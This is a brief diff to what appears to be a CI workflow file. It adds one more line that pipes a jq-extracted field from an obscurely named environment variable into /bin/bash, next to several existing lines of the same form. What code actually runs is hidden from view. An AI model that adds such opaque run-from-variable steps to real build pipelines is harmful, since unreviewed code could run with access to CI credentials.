@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$ci6" | jq -r .kpdw455 | /bin/bash
           echo $yb7728 | jq -r .oqws10178 | /bin/bash
           echo $megv46298 | jq -r .ap49326 | /bin/bash
+          echo $l75 | jq -r .xtwny45739 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
